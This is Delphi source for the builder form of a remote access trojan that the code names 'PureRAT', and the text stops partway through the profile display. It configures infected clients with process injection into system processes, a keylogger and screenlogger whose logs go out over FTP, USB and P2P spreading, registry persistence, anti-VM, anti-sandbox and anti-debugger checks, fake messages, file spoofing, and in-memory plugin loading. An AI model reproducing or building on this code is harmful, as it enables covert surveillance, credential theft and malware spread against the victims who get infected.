unit UnitBuilder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ExtCtrls, Buttons, StdCtrls, Spin, Menus, ImgList, uftp,
  UnitEncryption, UnitConstants, UnitIconChanger, UnitFunctions, uJSONConfig,
  UnitFilesManager, ShellAPI, UnitMain, Math, BTMemoryModule, UnitVariables,
  ToolWin, AdvMemo, StrUtils, SocketUnitEx, jpeg;

type
  TFormBuilder = class(TForm)
    dlgOpen1: TOpenDialog;
    dlgSave1: TSaveDialog;
    il1: TImageList;
    pm1: TPopupMenu;
    N1: TMenuItem;
    E1: TMenuItem;
    D1: TMenuItem;
    pm2: TPopupMenu;
    E2: TMenuItem;
    R1: TMenuItem;
    pnlBuilder: TPanel;
    tv1: TTreeView;
    lv1: TListView;
    pnlNetwork: TPanel;
    lbl7: TLabel;
    lbl8: TLabel;
    lbl9: TLabel;
    lbl10: TLabel;
    lv2: TListView;
    edtHost: TEdit;
    btn1: TButton;
    pnlProfile: TPanel;
    pnlInstallation: TPanel;
    chkInstall: TCheckBox;
    grpInstallation: TGroupBox;
    lbl3: TLabel;
    lbl4: TLabel;
    lbl5: TLabel;
    edtDestination: TEdit;
    edtFolder: TEdit;
    edtFilename: TEdit;
    chkMelt: TCheckBox;
    chkHide: TCheckBox;
    chkKeylogger: TCheckBox;
    chkReboot: TCheckBox;
    chkPersistence: TCheckBox;
    pnlMain: TPanel;
    grp3: TGroupBox;
    lbl1: TLabel;
    lbl2: TLabel;
    edtId: TEdit;
    edtPassword: TEdit;
    chk1: TCheckBox;
    grp5: TGroupBox;
    lbl12: TLabel;
    edtMutex: TEdit;
    edtProcessname: TEdit;
    btn2: TButton;
    pnlMessage: TPanel;
    img5: TImage;
    img6: TImage;
    img8: TImage;
    img7: TImage;
    btn3: TSpeedButton;
    chkFakemsg: TCheckBox;
    rgIcon: TRadioGroup;
    edtTitle: TEdit;
    redtBody: TRichEdit;
    btn4: TButton;
    rgButton: TRadioGroup;
    pnlMore: TPanel;
    grp4: TGroupBox;
    lbl24: TLabel;
    img1: TImage;
    edtIconPath: TEdit;
    pnlStartup: TPanel;
    chkRegStartup: TCheckBox;
    grpRegStartup: TGroupBox;
    chkHKCU: TCheckBox;
    chkHKLM: TCheckBox;
    chkPolicies: TCheckBox;
    edtKeyname: TEdit;
    chkDate: TCheckBox;
    chk12: TCheckBox;
    cbbDestination: TComboBoxEx;
    sePort: TSpinEdit;
    seDelay: TSpinEdit;
    cbbInjection: TComboBoxEx;
    pnlKeylogger: TPanel;
    chkFtplogs: TCheckBox;
    grpFtplogs: TGroupBox;
    lbl13: TLabel;
    edtFtphost: TEdit;
    lbl14: TLabel;
    edtFtpUser: TEdit;
    lbl15: TLabel;
    edtFtpPass: TEdit;
    lbl16: TLabel;
    edtFtpDir: TEdit;
    lbl17: TLabel;
    seFtpPort: TSpinEdit;
    chk2: TCheckBox;
    btn6: TButton;
    lbl19: TLabel;
    se1: TSpinEdit;
    lbl21: TLabel;
    pnlPlugin: TPanel;
    lvPlugin: TListView;
    pm4: TPopupMenu;
    A1: TMenuItem;
    R2: TMenuItem;
    chkAX: TCheckBox;
    edtAX: TEdit;
    btn7: TButton;
    grpSpreading: TGroupBox;
    chkUSB: TCheckBox;
    edtSpreading: TEdit;
    chkP2P: TCheckBox;
    lbl11: TLabel;
    tlb1: TToolBar;
    btn5: TToolButton;
    btn8: TToolButton;
    se2: TSpinEdit;
    lbl23: TLabel;
    btn9: TToolButton;
    pb1: TProgressBar;
    grpMsg: TGroupBox;
    advm1: TAdvMemo;
    lbl6: TLabel;
    pnlProtection: TPanel;
    chkVM: TCheckBox;
    chkSB: TCheckBox;
    chkDG: TCheckBox;
    grp1: TGroupBox;
    edt1: TEdit;
    lbl26: TLabel;
    lbl27: TLabel;
    grpPump: TGroupBox;
    chkPump: TCheckBox;
    edtPump: TEdit;
    lbl22: TLabel;
    lbl28: TLabel;
    cbbPump: TComboBoxEx;
    grpSpoof: TGroupBox;
    chkSpoof: TCheckBox;
    lbl29: TLabel;
    cbbSpoof: TComboBox;
    chkPA: TCheckBox;
    chkRun: TCheckBox;
    lbl18: TLabel;
    lbl20: TLabel;
    chkIcon: TCheckBox;
    rgCompression: TRadioGroup;
    cbbIcon: TComboBoxEx;
    cbbGroup: TComboBox;
    il2: TImageList;
    N2: TMenuItem;
    S1: TMenuItem;
    pnlAsm: TPanel;
    edtComp: TEdit;
    lbl31: TLabel;
    chkAsm: TCheckBox;
    grp2: TGroupBox;
    lbl32: TLabel;
    edtDesc: TEdit;
    lbl33: TLabel;
    edtName: TEdit;
    lbl34: TLabel;
    edtCopy: TEdit;
    lbl35: TLabel;
    edtTrade: TEdit;
    lbl36: TLabel;
    edtOName: TEdit;
    lbl37: TLabel;
    edtPName: TEdit;
    lbl38: TLabel;
    lbl39: TLabel;
    btn10: TButton;
    edtPBuild: TEdit;
    lbl40: TLabel;
    edtSBuild: TEdit;
    lbl41: TLabel;
    edtCmt: TEdit;
    lbl42: TLabel;
    edtFVer: TEdit;
    edtPVer: TEdit;
    pnlScr: TPanel;
    grp6: TGroupBox;
    edtWindows: TEdit;
    lbl43: TLabel;
    chkScrlogger: TCheckBox;
    pnlLogs: TPanel;
    lvLogs: TListView;
    btn11: TSpeedButton;
    il3: TImageList;
    chk3: TCheckBox;
    btn13: TToolButton;
    pnlPlugins: TPanel;
    lvPlugins: TListView;
    pm3: TPopupMenu;
    MenuItem2: TMenuItem;
    btn12: TButton;
    chk4: TCheckBox;
    N4: TMenuItem;
    T1: TMenuItem;
    btn14: TSpeedButton;
    btn15: TSpeedButton;
    lbl45: TLabel;
    cbbTodo: TComboBoxEx;
    btn17: TSpeedButton;
    btn18: TButton;
    cbb2: TComboBoxEx;
    btn19: TButton;
    grp7: TGroupBox;
    rb1: TRadioButton;
    rb2: TRadioButton;
    edtPluginUrl: TEdit;
    btn20: TSpeedButton;
    R3: TMenuItem;
    Q1: TMenuItem;
    N3: TMenuItem;
    chkStub: TCheckBox;
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lv1DblClick(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure E1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure E2Click(Sender: TObject);
    procedure lv2ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R1Click(Sender: TObject);
    procedure cbbInjectionChange(Sender: TObject);
    procedure chk1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure cbbDestinationChange(Sender: TObject);
    procedure chkRegStartupClick(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure chkFakemsgClick(Sender: TObject);
    procedure chkInstallClick(Sender: TObject);
    procedure chkFtplogsClick(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure lbl24Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure A1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure chkAXClick(Sender: TObject);
    procedure lvPluginContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure chkUSBClick(Sender: TObject);
    procedure chkP2PClick(Sender: TObject);
    procedure chkSpoofClick(Sender: TObject);
    procedure chkPumpClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure chkIconClick(Sender: TObject);
    procedure tv1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure chkAsmClick(Sender: TObject);
    procedure btn10Click(Sender: TObject);
    procedure btn11Click(Sender: TObject);
    procedure chk3Click(Sender: TObject);
    procedure lvPluginSelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure cbbGroupChange(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure lvPluginsDblClick(Sender: TObject);
    procedure btn12Click(Sender: TObject);
    procedure lvPluginClick(Sender: TObject);
    procedure chk4Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure btn14Click(Sender: TObject);
    procedure btn15Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure btn17Click(Sender: TObject);
    procedure btn18Click(Sender: TObject);
    procedure lv1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure btn19Click(Sender: TObject);
    procedure btn20Click(Sender: TObject);
    procedure rb1Click(Sender: TObject);
    procedure rb2Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Q1Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    EnableCloseButtton: Boolean;
    ClientFile, IconPath, ProfileConfig,
    ProfileName, HostList: string;
    function GrabHostList: string;
    procedure SetHostList(HostList: string);
    procedure ShowProfile;
    procedure ListProfiles;
    procedure SaveProfile(pName: string);
    function TestHost(Host: string; Port: Integer): Boolean;
    function GetVersionData(const FileName: string): Boolean;
    procedure AddLog(Log: string; lColor: TColor = clBlack);                   
    procedure AddPlugin(pPath: string);
  public
    { Public declarations }
  end;

var
  FormBuilder: TFormBuilder;

implementation

uses
  UnitPluginsManager;

{$R *.dfm}

type
  PClientConfiguration = ^TClientConfiguration;
  TClientConfiguration = record
    Hosts: array [0..4] of string;
    Ports: array [0..4] of Word;
    FTPOptions, MessageParams: array[0..3] of string;
    KeylogSize: Integer;
    Delay, FTPPort, FTPDelay: Word;
    ClientId, StartupKey, Password, User_Id, MutexName,
    Foldername, FileName, Destination, InjectInto, ActiveX,
    SpreadAs, GroupId, P2PNames, Windows, PluginUrl: string;
    FakeMessage, Install, Keylogger, Melt, Startup, Hide, USB,
    WaitReboot, ChangeDate, HKCUStartup, HKLMStartup, P2P,
    PoliciesStartup, Persistence, FTPLogs, AntiVM, AntiSB,
    AntiDG, AntiPA, RunOnceStartup, Screenlogger, AntiRemove: Boolean;
  end;

  TFileOptions = class
    Execute: Boolean;
  end;

var
  ClientConfiguration: TClientConfiguration;

procedure TFormBuilder.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormBuilder.lv1ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then            
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;

procedure TFormBuilder.lv2ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv2.Selected) then
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False
  else for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
end;

procedure TFormBuilder.lv1DblClick(Sender: TObject);
begin
  E1.Click;
end;
        
procedure TFormBuilder.tv1Click(Sender: TObject);
begin
  if not Assigned(tv1.Selected) then Exit;

  if tv1.Items.Item[0].Selected then pnlMain.BringToFront else
  if tv1.Items.Item[1].Selected then pnlNetwork.BringToFront else
  if tv1.Items.Item[2].Selected then pnlInstallation.BringToFront else

  if tv1.Items.Item[3].Selected then
  begin
    if chkInstall.Checked = False then
    begin
      MessageBox(Handle, 'Enable installation first.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    pnlStartup.BringToFront;
  end
  else

  if tv1.Items.Item[4].Selected then pnlProtection.BringToFront else

  if tv1.Items.Item[5].Selected then
  begin
    if chkInstall.Checked = False then
    begin
      MessageBox(Handle, 'Enable installation first.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    pnlMessage.BringToFront;
  end
  else

  if tv1.Items.Item[6].Selected then
  begin
    if (chkInstall.Checked = False) or
      ((chkInstall.Checked = True) and (chkKeylogger.Checked = False))
    then
    begin
      MessageBox(Handle, 'Enable offline keylogger first.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    pnlKeylogger.BringToFront;
  end
  else

  if tv1.Items.Item[7].Selected then
  begin
    if (chkInstall.Checked = False) or
      ((chkInstall.Checked = True) and (chkScrlogger.Checked = False))
    then
    begin
      MessageBox(Handle, 'Enable screenlogger first.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    pnlScr.BringToFront;
  end
  else

  if tv1.Items.Item[8].Selected then pnlPlugin.BringToFront else
  if tv1.Items.Item[9].Selected then pnlAsm.BringToFront else

  if tv1.Items.Item[10].Selected then pnlMore.BringToFront else
  if tv1.Items.Item[11].Selected then
  begin
    advm1.Lines.Clear;
    pnlProfile.BringToFront;
    ProfileName := '';
    lv1.ItemIndex := -1;
  end;
end;

procedure TFormBuilder.N1Click(Sender: TObject);
begin
  btn19Click(Sender);
end;

function TFormBuilder.GrabHostList: string;
var
  i: Integer;
begin
  Result := '';
  if lv2.Items.Count = 0 then Exit;
  for i := 0 to lv2.Items.Count - 1 do
  Result := Result + lv2.Items[i].Caption + ':' + lv2.Items[i].SubItems[0] + '|';
end;

procedure TFormBuilder.SetHostList(HostList: string);
var
  TmpItem: TListItem;
begin
  lv2.Clear;
  lv2.Items.BeginUpdate;

  while HostList <> '' do
  begin
    TmpItem := lv2.Items.Add;
    TmpItem.Caption := Copy(HostList, 1, Pos(':', HostList) - 1);
    Delete(HostList, 1, Pos(':', HostList));
    TmpItem.SubItems.Add(Copy(HostList, 1, Pos('|', HostList) - 1));
    Delete(HostList, 1, Pos('|', HostList));
    TmpItem.SubItems.Add('Unknown');
    TmpItem.ImageIndex := 15;
  end;

  lv2.Items.EndUpdate;
end;

procedure TFormBuilder.E1Click(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then Exit;
  ProfileName := lv1.Selected.Caption;
  edtMutex.Clear;

  pnlMain.BringToFront;                                                        
  pnlBuilder.BringToFront;
end;

procedure TFormBuilder.D1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if MessageBox(Handle, 'Are you sure you want to delete selected profile?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;
                              
  advm1.Lines.Clear;
  edtMutex.Clear;
  
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Profiles\' + lv1.Selected.Caption + '.profile';
  if FileExists(TmpStr) then DeleteFile(TmpStr);
  lv1.Selected.Delete;
end;

procedure TFormBuilder.E2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lv2.Selected) then Exit;
  TmpStr := InputBox('Edit host', 'New address', lv2.Selected.Caption + ':' + lv2.Selected.SubItems[0]);
  if (TmpStr = '') or (Pos(':', TmpStr) < 0) then Exit;
  lv2.Selected.Caption := Copy(TmpStr, 1, Pos(':', TmpStr)-1);
  Delete(TmpStr, 1, Pos(':', TmpStr));
  lv2.Selected.SubItems[0] := TmpStr;
  lv2.Selected.SubItems[1] := 'Unknown';
  lv2.Selected.ImageIndex := 15;
end;

procedure TFormBuilder.R1Click(Sender: TObject);
begin
  lv2.Selected.Delete;
end;

procedure TFormBuilder.chk1Click(Sender: TObject);
begin
  if chk1.Checked then edtPassword.PasswordChar := #0 else
    edtPassword.PasswordChar := '*';
end;

procedure TFormBuilder.cbbInjectionChange(Sender: TObject);
var
  i: Integer;
begin
  if cbbInjection.ItemIndex = 0 then
  begin
    edtProcessname.Text := '%DEFAULTBROWSER%';
    edtProcessname.Enabled := False;
  end
  else
  if cbbInjection.ItemIndex = 1 then
  begin
    edtProcessname.Text := 'explorer.exe';
    edtProcessname.Enabled := False;
  end
  else
  if cbbInjection.ItemIndex = 2 then
  begin
    edtProcessname.Text := 'svchost.exe';
    edtProcessname.Enabled := False;
  end
  else
  if cbbInjection.ItemIndex = 3 then
  begin
    edtProcessname.Text := 'notepad.exe';
    edtProcessname.Enabled := False;
  end 
  else
  if cbbInjection.ItemIndex = 4 then
  begin
    edtProcessname.Text := 'calc.exe';
    edtProcessname.Enabled := True;
  end
  else
  begin
    edtProcessname.Text := '%NOINJECTION%';
    edtProcessname.Enabled := False;
  end;
end;

procedure TFormBuilder.btn2Click(Sender: TObject);
begin
  edtMutex.Text := RandomString(20);
end;

function TFormBuilder.TestHost(Host: string; Port: Integer): Boolean;
var
  ClientSocket: TClientSocket;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(Host, Port);
  Result := ClientSocket.Connected;
  ClientSocket.Disconnect;
  ClientSocket.Free;
  ClientSocket := nil;
end;

procedure TFormBuilder.btn1Click(Sender: TObject);
var
  TmpStr: string;
  TmpItem: TListItem;
begin
  if (edtHost.Text = '') or (sePort.Text = '') then Exit;

  if lv2.Items.Count >= 5 then
  begin
    MessageBox(Handle, 'Maximum hosts reached.',  PROGRAMINFOS, MB_ICONINFORMATION);
    Exit;
  end;

  TmpItem := lv2.Items.Add;
  TmpItem.Caption := edtHost.Text;
  TmpItem.SubItems.Add(sePort.Text);
  TmpItem.SubItems.Add('Unknown');
  TmpItem.ImageIndex := 15;
end;

procedure TFormBuilder.chkInstallClick(Sender: TObject);
begin
  if chkInstall.Checked then
  begin
    grpInstallation.Visible := True;
    chkUSBClick(Sender);
    chkP2PClick(Sender);
  end
  else
  begin
    grpInstallation.Visible := False;
    grpSpreading.Visible := False;
    grp1.Visible := False;
  end;
end;

procedure TFormBuilder.cbbDestinationChange(Sender: TObject);
var
  i: Integer;
begin
  if cbbDestination.ItemIndex = 6 then
  begin
    edtDestination.Text := '';
    edtDestination.Visible := True;
  end
  else
  begin
    i := cbbDestination.ItemIndex;
    edtDestination.Text := cbbDestination.Items.Strings[i];
    edtDestination.Visible := False;
  end;
end;

procedure TFormBuilder.chkRegStartupClick(Sender: TObject);
begin
  grpRegStartup.Visible := chkRegStartup.Checked;
end;

function ShowMsg(Hwnd: HWND; Text: string; Title: string; mType: Integer; bType: Integer): Integer;
begin
  if mType = 0 then mType := MB_ICONERROR else
  if mType = 1 then mType := MB_ICONWARNING else
  if mType = 2 then mType := MB_ICONQUESTION else
  if mType = 3 then mType := MB_ICONINFORMATION else mType := 0;

  case bType of
    0: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType);
    1: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_OKCANCEL);
    2: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNO);
    3: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_YESNOCANCEL);
    4: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_RETRYCANCEL);
    5: Result := MessageBox(Hwnd, PChar(Text), PChar(Title), mType + MB_ABORTRETRYIGNORE);
  end;
end;
    
procedure TFormBuilder.chkFakemsgClick(Sender: TObject);
begin
  grpMsg.Visible := chkFakemsg.Checked;
end;

procedure TFormBuilder.btn4Click(Sender: TObject);
begin
  if grpMsg.Visible = False then Exit;
  if (edtTitle.Text = '') or (redtBody.Text = '') then Exit;
  ShowMsg(Handle, redtBody.Text, edtTitle.Text, rgIcon.ItemIndex, rgButton.ItemIndex);
end;

procedure TFormBuilder.chkFtplogsClick(Sender: TObject);
begin
  grpFtplogs.Visible := chkFtplogs.Checked;
end;

procedure TFormBuilder.chk2Click(Sender: TObject);
begin
  if chk2.Checked then edtFtpPass.PasswordChar := #0 else edtFtpPass.PasswordChar := '*';
end;

procedure TFormBuilder.btn6Click(Sender: TObject);
var
  FtpAccess: tFtpAccess;
begin
  if grpFtplogs.Visible = False then Exit;

  if (edtFtphost.Text = '') or (edtFtpUser.Text = '') or (edtFtpPass.Text = '') or
    (edtFtpDir.Text = '')
  then
  begin
    MessageBox(Handle, 'One or more entry are empty.',  PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  FTpAccess := tFtpAccess.create(edtFtphost.Text, edtFtpUser.Text, edtFtpPass.Text, seFtpPort.Value);

  if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
  begin
    MessageBox(Handle, 'Failed to connect.', PROGRAMINFOS, MB_ICONERROR);
    FTpAccess.Free;
    Exit;
  end;

  if FTpAccess.SetDir('./' + edtFtpDir.Text) = False then
  begin
    MessageBox(Handle, 'Failed to access directory.', PROGRAMINFOS, MB_ICONERROR);
    FTpAccess.Free;
    Exit;
  end;

  if FTpAccess.PutFile(dlgOpen1.FileName, ExtractFileName(dlgOpen1.FileName)) = False then
  begin
    MessageBox(Handle, 'Failed to send file.', PROGRAMINFOS, MB_ICONERROR);
    FTpAccess.Free;
    Exit;
  end;

  FTpAccess.Free;
  MessageBox(Handle, 'File sent successfully!', PROGRAMINFOS, MB_ICONERROR);
end;

procedure TFormBuilder.lbl24Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Icon file (*.ico); Executable file (*.exe)|*.ico; *.exe';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  if LowerCase(ExtractFileExt(dlgOpen1.FileName)) = '.ico' then
  begin
    img1.Picture.LoadFromFile(dlgOpen1.FileName);
    edtIconPath.Text := dlgOpen1.FileName;
  end
  else

  if LowerCase(ExtractFileExt(dlgOpen1.FileName)) = '.exe' then
  begin
    try
      TmpStr := ExtractFilePath(ParamStr(0)) + 'Icons';
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr1 := ExtractFileName(dlgOpen1.FileName);
      TmpStr1 := Copy(TmpStr1, 1, Pos('.', TmpStr1)-1);
      TmpStr1 := TmpStr1 + '.ico';
      TmpStr := TmpStr + '\' + TmpStr1;
      edtIconPath.Text := TmpStr;

      SaveApplicationIconGroup(PChar(TmpStr), PChar(dlgOpen1.FileName));
    except
      MessageBox(Handle, 'Failed to save executable icon.', PROGRAMINFOS, MB_ICONERROR);
    end;

    img1.Picture.LoadFromFile(TmpStr);
  end;
end;

procedure TFormBuilder.A1Click(Sender: TObject);
var
  Module: PBTMemoryModule;
  TmpList: TStringArray;
  TmpItem: TListItem;
  Buffer, TmpStr, TmpStr1: string;
  p: Pointer;
  PluginInfos: function(): PChar;
  i: Integer;
  BufferSize: Int64;
  jpg: TJPEGImage;
  Bmp: TBitmap;
  Stream: TMemoryStream;
  FileOptions: TFileOptions;
begin
  dlgOpen1.InitialDir := PluginsPath;
  dlgOpen1.Filter := 'Plugin file (*.plugin)|*.plugin';
  dlgOpen1.DefaultExt := 'plugin';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
         
  if lvPlugin.Items.Count > 0 then
  for i := lvPlugin.Items.Count -1 downto 0 do
  if lvPlugin.Items.Item[i].Caption = dlgOpen1.FileName then Exit;

  Buffer := FileToStr(dlgOpen1.FileName);
  BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
  Delete(Buffer, 1, Pos('|', Buffer));
  TmpStr1 := Copy(Buffer, 1, BufferSize);                  
  Delete(Buffer, 1, BufferSize); 
  Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
  
  if Buffer = '' then
  begin
    MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  p := @Buffer[1];

  try
    Module := BTMemoryLoadLibary(p, Length(Buffer));
    if Module = nil then
    begin
      MessageBox(Handle, 'Failed to load plugin.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
    if Assigned(PluginInfos) then
    begin
      TmpStr := PluginInfos();
      if (TmpStr = '') or (Pos('|', TmpStr) <= 0) then
      begin
        MessageBox(Handle, 'This file is not a valid PureRAT plugin.', PROGRAMINFOS, MB_ICONERROR);
        Exit;
      end;

      TmpList := ParseString('|', TmpStr);

      if TmpList[4] <> 'Client' then
      begin
        MessageBox(Handle, 'Only plugins of type Client are allowed.', PROGRAMINFOS, MB_ICONERROR);
        Exit;
      end;

      lvPlugin.Items.BeginUpdate;

      TmpItem := lvPlugin.Items.Add;
      TmpItem.Caption := dlgOpen1.FileName;
      TmpItem.SubItems.Add(TmpList[0]);
      TmpItem.SubItems.Add(TmpList[1]);
      TmpItem.SubItems.Add(TmpList[2]);
      TmpItem.SubItems.Add(TmpList[3]);
      
      FileOptions := TFileOptions.Create;
      FileOptions.Execute := True;
      TmpItem.Data := FileOptions;
      
      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(TmpStr1)^, Length(TmpStr1));
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Exit;
      end;

      TmpItem.ImageIndex := il3.Add(Bmp, nil);
      Bmp.Free;

      lvPlugin.Items.EndUpdate;
    end
    else
    begin
      MessageBox(Handle, 'This file is not a valid PureRAT plugin.',
        PROGRAMINFOS, MB_ICONERROR);
    end;
  finally
    BTMemoryFreeLibrary(Module);
  end;
end;

procedure TFormBuilder.R2Click(Sender: TObject);
begin
  if not Assigned(lvPlugin.Selected) then Exit;
  lvPlugin.Selected.Delete;
end;
       
procedure TFormBuilder.lvPluginContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvPlugin.Selected) then
  begin
    for i := 0 to pm4.Items.Count - 1 do pm4.Items[i].Enabled := False;
    pm4.Items[0].Enabled := True;
  end
  else for i := 0 to pm4.Items.Count - 1 do pm4.Items[i].Enabled := True;
end;
   
procedure TFormBuilder.ShowProfile;
var
  i: Integer;
begin
  advm1.Lines.Clear;
  advm1.Lines.Add(JustL('General settings', 0));
  advm1.Lines.Add(JustL('  Group id', 40) + cbbGroup.Text);
  advm1.Lines.Add(JustL('  Identification', 40) + edtId.Text);
  advm1.Lines.Add(JustL('  Password', 40) + edtPassword.Text);
  advm1.Lines.Add(JustL('  Process injection', 40) + edtProcessname.Text);
  advm1.Lines.Add(JustL('  Process mutex', 40) + edtMutex.Text);
  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Network', 0));

  for i := 0 to lv2.Items.Count - 1 do
  if (lv2.Items.Item[i].Caption <> '') and (lv2.Items.Item[i].SubItems[0] <> '') then
  advm1.Lines.Add(JustL('  Host[' + IntToStr(i) + ']', 40) +
    lv2.Items.Item[i].Caption + ':' + lv2.Items.Item[i].SubItems[0]);

  advm1.Lines.Add(JustL('  Reconnection delay', 40) + seDelay.Text + ' second(s)');
  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Installation', 0));
  advm1.Lines.Add(JustL('  Install client', 40) + MyBoolToStr(chkInstall.Checked));

  if chkInstall.Checked then
  begin
    advm1.Lines.Add(JustL('  Destination file', 40) + edtDestination.Text);
    advm1.Lines.Add(JustL('  Folder name', 40) + edtFolder.Text);
    advm1.Lines.Add(JustL('  Filename', 40) + edtFilename.Text);
    advm1.Lines.Add(JustL('  Melt file after installation', 40) + MyBoolToStr(chkMelt.Checked));
    advm1.Lines.Add(JustL('  Change folder and filename time', 40) + MyBoolToStr(chkDate.Checked));
    advm1.Lines.Add(JustL('  Hide folder and filename', 40) + MyBoolToStr(chkHide.Checked));
    advm1.Lines.Add(JustL('  Enable keylogger', 40) + MyBoolToStr(chkKeylogger.Checked));
    advm1.Lines.Add(JustL('  Enable screenlogger', 40) + MyBoolToStr(chkScrlogger.Checked));
    advm1.Lines.Add(JustL('  Wait for system reboot', 40) + MyBoolToStr(chkReboot.Checked));
    advm1.Lines.Add(JustL('  Persistence installation', 40) + MyBoolToStr(chkPersistence.Checked));
  end;

  if chkInstall.Checked then
  begin   
    advm1.Lines.Add('');
    advm1.Lines.Add(JustL('Spreading', 0));
    advm1.Lines.Add(JustL('  USB spreading', 40) + MyBoolToStr(chkUSB.Checked));
    if chkUSB.Checked then advm1.Lines.Add(JustL('  Spread name', 40) + edtSpreading.Text);
    advm1.Lines.Add(JustL('  P2P spreading', 40) + MyBoolToStr(chkP2P.Checked));
    if chkP2P.Checked then advm1.Lines.Add(JustL('  P2P names', 40) + edt1.Text);
  end;
       
  if chkInstall.Checked then
  begin   
    advm1.Lines.Add('');
    advm1.Lines.Add(JustL('Screenlogger', 0));
    advm1.Lines.Add(JustL('  Windows titles filter', 40) + edtWindows.Text);
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Startup', 0));
  advm1.Lines.Add(JustL('  Registry startup', 40) + MyBoolToStr(chkRegStartup.Checked));

  if chkRegStartup.Checked then
  begin
    advm1.Lines.Add(JustL('  HKCU', 40) + MyBoolToStr(chkHKCU.Checked));
    advm1.Lines.Add(JustL('  HKLM', 40) + MyBoolToStr(chkHKLM.Checked));
    advm1.Lines.Add(JustL('  Policies', 40) + MyBoolToStr(chkPolicies.Checked));
    advm1.Lines.Add(JustL('  RunOnce', 40) + MyBoolToStr(chkPolicies.Checked));   
    advm1.Lines.Add(JustL('  Registry key', 40) + edtKeyname.Text);
    if edtAX.Text <> '' then advm1.Lines.Add(JustL('  ActiveX key', 40) + edtAX.Text);
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Protection', 0));
